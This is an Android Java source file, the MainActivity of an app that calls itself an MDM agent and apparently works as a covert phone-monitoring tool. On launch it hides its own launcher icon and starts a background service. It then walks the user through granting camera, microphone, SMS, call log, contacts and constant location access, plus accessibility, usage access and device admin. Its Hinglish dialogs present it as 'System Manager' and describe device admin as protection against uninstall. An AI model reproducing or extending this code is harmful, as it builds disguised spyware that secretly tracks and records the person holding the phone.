package com.mdmagent.app;

import android.Manifest;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.text.TextUtils;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.getcapacitor.BridgeActivity;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends BridgeActivity {

    private static final int RC_PERMS        = 1001;
    private static final int RC_BG_LOC       = 1002;
    private static final int RC_DEVICE_ADMIN = 2001;

    private static final int STEP_PERMISSIONS   = 0;
    private static final int STEP_BG_LOCATION   = 1;
    private static final int STEP_BATTERY       = 2;
    private static final int STEP_USAGE         = 3;
    private static final int STEP_ACCESSIBILITY = 4;
    private static final int STEP_DEVICE_ADMIN  = 5;
    private static final int STEP_OEM_AUTOSTART = 6;
    private static final int STEP_DONE          = 7;

    private static final String PREFS_NAME = "mdm_setup";
    private static final String KEY_DONE   = "setup_done";

    private int     currentStep     = STEP_PERMISSIONS;
    private boolean waitingForResume = false;
    private ComponentName adminComponent;

    private static final String[] REQUIRED_PERMISSIONS = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        registerPlugin(MdmPlugin.class);
        registerPlugin(NativeSocketPlugin.class);
        super.onCreate(savedInstanceState);

        adminComponent = new ComponentName(this, MdmDeviceAdminReceiver.class);
        hideLauncherIcon();
        startForegroundService(new Intent(this, MdmForegroundService.class));

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        if (!prefs.getBoolean(KEY_DONE, false)) {
            // First time — run setup wizard
            runStep(STEP_PERMISSIONS);
        }
        // If already done — just show the WebView (BridgeActivity handles it)
    }

    // ── Step runner ───────────────────────────────────────────────────────

    private void runStep(int step) {
        currentStep = step;
        switch (step) {
            case STEP_PERMISSIONS:   doPermissions();   break;
            case STEP_BG_LOCATION:   doBgLocation();    break;
            case STEP_BATTERY:       doBattery();       break;
            case STEP_USAGE:         doUsage();         break;
            case STEP_ACCESSIBILITY: doAccessibility(); break;
            case STEP_DEVICE_ADMIN:  doDeviceAdmin();   break;
            case STEP_OEM_AUTOSTART: doOemAutoStart();  break;
            case STEP_DONE:          doFinish();        break;
        }
    }

    private void nextStep() { runStep(currentStep + 1); }

    // ── Step 0 — Runtime permissions ──────────────────────────────────────

    private void doPermissions() {
        List<String> missing = new ArrayList<>();
        for (String perm : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED)
                missing.add(perm);
        }
        if (!missing.isEmpty())
            ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), RC_PERMS);
        else
            nextStep();
    }

    @Override
    public void onRequestPermissionsResult(int rc, String[] perms, int[] results) {
        super.onRequestPermissionsResult(rc, perms, results);
        if (rc == RC_PERMS || rc == RC_BG_LOC) nextStep();
    }

    // ── Step 1 — Background location ──────────────────────────────────────

    private void doBgLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            new AlertDialog.Builder(this)
                .setTitle("Location Always On")
                .setMessage("Next screen mein 'Allow all the time' select karo taaki location background mein bhi kaam kare.")
                .setCancelable(false)
                .setPositiveButton("Continue", (d, w) ->
                    ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION}, RC_BG_LOC))
                .setNegativeButton("Skip", (d, w) -> nextStep())
                .show();
        } else {
            nextStep();
        }
    }

    // ── Step 2 — Battery optimization (direct system popup, no pre-dialog) ─

    private void doBattery() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    waitingForResume = true;
                    Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(i);
                    return;
                } catch (Exception ignored) {}
            }
        }
        nextStep();
    }

    // ── Step 3 — Usage stats ──────────────────────────────────────────────

    private void doUsage() {
        if (isUsageAccessGranted()) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Usage Access")
            .setMessage("1. Tap 'Open Settings'\n2. 'System Manager' dhundho\n3. Toggle ON karo\n4. Back press karo")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                try {
                    Intent i = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                    i.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(i);
                } catch (Exception ignored) {
                    try { startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)); }
                    catch (Exception ignored2) { nextStep(); }
                }
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private boolean isUsageAccessGranted() {
        try {
            UsageStatsManager usm = (UsageStatsManager) getSystemService(USAGE_STATS_SERVICE);
            long now = System.currentTimeMillis();
            List<UsageStats> stats = usm.queryUsageStats(
                UsageStatsManager.INTERVAL_DAILY, now - 60_000, now);
            return stats != null && !stats.isEmpty();
        } catch (Exception e) { return false; }
    }

    // ── Step 4 — Accessibility service ───────────────────────────────────

    private void doAccessibility() {
        if (isAccessibilityEnabled()) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Auto-Connect Enable Karo")
            .setMessage("Phone restart ke baad auto-connect ke liye:\n\n1. 'Open Settings' tap karo\n2. 'System Manager' dhundho\n3. Toggle ON → Allow\n4. Back press karo")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private boolean isAccessibilityEnabled() {
        try {
            String svc = getPackageName() + "/" + MdmAccessibilityService.class.getName();
            int on = Settings.Secure.getInt(
                getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (on == 1) {
                String list = Settings.Secure.getString(
                    getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
                if (list != null) {
                    TextUtils.SimpleStringSplitter sp = new TextUtils.SimpleStringSplitter(':');
                    sp.setString(list);
                    while (sp.hasNext()) {
                        if (sp.next().equalsIgnoreCase(svc)) return true;
                    }
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    // ── Step 5 — Device Admin ─────────────────────────────────────────────

    private void doDeviceAdmin() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
        if (dpm == null || dpm.isAdminActive(adminComponent)) { nextStep(); return; }
        new AlertDialog.Builder(this)
            .setTitle("Security Protection")
            .setMessage("Next screen mein 'Activate' tap karo — yeh unauthorized uninstall se protect karta hai.")
            .setCancelable(false)
            .setPositiveButton("Continue", (d, w) -> {
                Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "Keeps system security active and prevents unauthorized removal");
                startActivityForResult(i, RC_DEVICE_ADMIN);
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == RC_DEVICE_ADMIN) nextStep();
    }

    // ── Step 6 — OEM AutoStart ────────────────────────────────────────────

    private void doOemAutoStart() {
        String mfr = Build.MANUFACTURER.toLowerCase();
        boolean isVivo   = mfr.contains("vivo");
        boolean isHuawei = mfr.contains("huawei") || mfr.contains("honor");
        boolean isOppo   = mfr.contains("oppo") || mfr.contains("realme");
        boolean isMiui   = isMiui() || mfr.contains("xiaomi") || mfr.contains("redmi");

        if (!isVivo && !isHuawei && !isOppo && !isMiui) { nextStep(); return; }

        String brand = isVivo ? "Vivo" : isHuawei ? "Huawei/Honor" : isOppo ? "OPPO/Realme" : "Xiaomi";
        new AlertDialog.Builder(this)
            .setTitle("AutoStart — " + brand)
            .setMessage("1. 'Open Settings' tap karo\n2. 'System Manager' dhundho\n3. AutoStart ON karo\n4. Back press karo")
            .setCancelable(false)
            .setPositiveButton("Open Settings", (d, w) -> {
                waitingForResume = true;
                openOemScreen(mfr, isMiui);
            })
            .setNegativeButton("Skip", (d, w) -> nextStep())
            .show();
    }

    private void openOemScreen(String mfr, boolean isMiui) {
        if (isMiui) { openMiuiAutoStart(); return; }
        try {
            Intent i = new Intent();
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            if (mfr.contains("vivo")) {
                i.setComponent(new ComponentName("com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.PurviewTabActivity"));
            } else if (mfr.contains("huawei") || mfr.contains("honor")) {
                i.setComponent(new ComponentName("com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"));
            } else if (mfr.contains("oppo") || mfr.contains("realme")) {
                i.setComponent(new ComponentName("com.coloros.safecenter",
                    "com.coloros.privacypermissionsentry.PermissionTopActivity"));
            }
            startActivity(i);
        } catch (Exception ignored) {
            try {
                Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                f.setData(Uri.parse("package:" + getPackageName()));
                startActivity(f);
            } catch (Exception ignored2) { nextStep(); }
        }
    }

    private void openMiuiAutoStart() {
        String[][] targets = {
            { "com.miui.securitycenter", "com.miui.permcenter.autostart.AutoStartManagementActivity" },
            { "com.miui.securitycenter", "com.miui.permcenter.MainAcitivity" },
            { "com.miui.securitycenter", "com.miui.securitycenter.MainActivity" },
        };
        for (String[] t : targets) {
            try {
                Intent i = new Intent();
                i.setComponent(new ComponentName(t[0], t[1]));
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
                return;
            } catch (Exception ignored) {}
        }
        try {
            Intent f = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            f.setData(Uri.parse("package:" + getPackageName()));
            startActivity(f);
        } catch (Exception ignored) { nextStep(); }
    }

    private boolean isMiui() {
        try { Class.forName("miui.os.Build"); return true; }
        catch (ClassNotFoundException e) { return false; }
    }

    // ── Step 7 — Done ────────────────────────────────────────────────────

    private void doFinish() {
        // Save flag so wizard never runs again
        getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_DONE, true).apply();

        new AlertDialog.Builder(this)
            .setTitle("Setup Complete!")
            .setMessage("System Manager active ho gaya hai aur background mein chal raha hai.")
            .setCancelable(true)
            .setPositiveButton("OK", null) // just dismiss — app stays open showing dashboard
            .show();
    }

    private void hideLauncherIcon() {
        try {
            getPackageManager().setComponentEnabledSetting(
                new ComponentName(this, "com.mdmagent.app.MainActivityLauncher"),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
        } catch (Exception ignored) {}
    }

    // ── onResume — return from Settings screens ───────────────────────────

    @Override
    public void onResume() {
        super.onResume();
        if (waitingForResume) {
            waitingForResume = false;
            nextStep();
        }
    }
}
